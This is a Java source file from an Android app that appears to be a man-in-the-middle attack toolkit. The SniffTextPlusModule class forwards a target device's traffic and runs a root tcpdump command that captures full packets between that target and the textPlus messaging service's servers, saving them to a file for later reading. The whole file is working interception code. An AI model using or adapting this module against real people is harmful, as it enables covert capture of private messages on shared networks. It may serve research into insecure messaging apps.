package it.uniroma2.giadd.aitm.models.modules;

import android.content.Context;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;

import it.uniroma2.giadd.aitm.R;
import it.uniroma2.giadd.aitm.interfaces.OnCommandListener;
import it.uniroma2.giadd.aitm.managers.RootManager;

/**
 * Created by Alessandro Di Diego on 13/08/16.
 */

/** TODO: filter by (ads.nexage.com and port 80) or (*.nextplus.me and port 443,80)
 * or
 * (ads.nexage.com and port 80) or ((*.app.nextplus.me or *pic.nextplus.me) and port 80)
 * or
 * (ads.nexage.com and port 80) or (ASNumber and port 443,80)
*/
public class SniffTextPlusModule extends MitmModule implements Parcelable {

    private static final String TAG = SniffTextPlusModule.class.getName();
    public static final String PREFIX = "textPlus_";

    private static final String TCPDUMP_COMMAND = "tcpdump -i <interface> -XSs 0 -U -w <path> host <target> and \"not arp and not rarp and ((host ads.nexage.com and port 80) or (<netfilter>))\"";

    public SniffTextPlusModule() {
        super();
        setForwardConnections(true);
    }

    @Override
    public void initialize(Context context) {
        super.initialize(context);
        setModuleTitle(context.getString(R.string.module_snifftextplus_title));
        setModuleMessage(context.getString(R.string.module_snifftextplus_message));

        String netFilter = "";
        int i;
        for (i = 0; i < getNets().size(); i++) {
            netFilter += "net " + getNets().get(i);
            if (i < (getNets().size() - 1)) netFilter += " or ";
        }
        //dump to file
        setDumpToFile(true);
        String command = context.getFilesDir() + "/" + TCPDUMP_COMMAND;
        command = command.replaceAll("<path>", getDumpPath());
        command = command.replaceAll("<interface>", getInterfaceName());
        command = command.replaceAll("<target>", target);
        command = command.replace("<netfilter>", netFilter);
        commands.add(command);
    }

    @Override
    public void onModuleTermination(Context context) {
        RootManager.killByName(context, "tcpdump", RootManager.SIGINT, new OnCommandListener() {
            @Override
            public void onShellError(int exitCode) {
                Log.d(TAG, "ERROR: EXIT CODE:" + exitCode);
            }

            @Override
            public void onCommandResult(int commandCode, int exitCode) {
                Log.d(TAG, "tcpdump terminated; EXIT CODE:" + exitCode);
            }

            @Override
            public void onLine(String line) {
                Log.d(TAG, "LINE: " + line);
            }
        });
        super.onModuleTermination(context);
    }

    @Override
    public int describeContents() {
        return 0;
    }

    @Override
    public void writeToParcel(Parcel dest, int flags) {
        super.writeToParcel(dest, flags);
    }

    protected SniffTextPlusModule(Parcel in) {
        super(in);
    }

    public static final Creator<SniffTextPlusModule> CREATOR = new Creator<SniffTextPlusModule>() {
        @Override
        public SniffTextPlusModule createFromParcel(Parcel source) {
            return new SniffTextPlusModule(source);
        }

        @Override
        public SniffTextPlusModule[] newArray(int size) {
            return new SniffTextPlusModule[size];
        }
    };
}
